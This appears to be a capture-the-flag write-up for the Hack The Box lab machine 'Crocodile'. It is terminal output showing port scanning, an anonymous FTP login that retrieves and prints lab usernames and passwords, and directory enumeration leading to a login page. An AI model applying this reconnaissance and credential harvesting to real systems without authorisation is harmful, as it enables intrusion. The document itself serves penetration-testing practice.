# Crocodile

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.149.173
PING 10.129.149.173 (10.129.149.173) 56(84) bytes of data.
64 bytes from 10.129.149.173: icmp_seq=1 ttl=63 time=25.6 ms
64 bytes from 10.129.149.173: icmp_seq=2 ttl=63 time=28.5 ms
^C
--- 10.129.149.173 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1012ms
rtt min/avg/max/mdev = 25.588/27.040/28.493/1.452 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p- 10.129.149.173
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 13:42 EDT
Nmap scan report for 10.129.149.173
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 45.52 seconds
```

```
──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -p21 10.129.149.173
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 13:44 EDT
Nmap scan report for 10.129.149.173
Host is up (0.027s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.129.149.173
Connected to 10.129.149.173.
220 (vsFTPd 3.0.3)
Name (10.129.149.173:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||44537|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||49723|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |*************************************************************|    33       54.80 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.23 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||49295|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |*************************************************************|    62      688.03 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (2.20 KiB/s)
ftp> exit
221 Goodbye.
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```


![image](https://github.com/user-attachments/assets/11c0dff2-05e0-474b-a474-3630eddab07a)


```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV -p80 10.129.149.173
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 13:57 EDT
Nmap scan report for 10.129.149.173
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -x php -w /usr/share/wordlists/dirb/common.txt -u 10.129.149.173
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.149.173
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 317] [--> http://10.129.149.173/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 314] [--> http://10.129.149.173/css/]
/dashboard            (Status: 301) [Size: 320] [--> http://10.129.149.173/dashboard/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.149.173/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 313] [--> http://10.129.149.173/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 279]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

![image](https://github.com/user-attachments/assets/db488752-25fb-42bb-8d53-1c167992e0e2)

![image](https://github.com/user-attachments/assets/20048c87-f840-4950-8f93-17feb174263e)








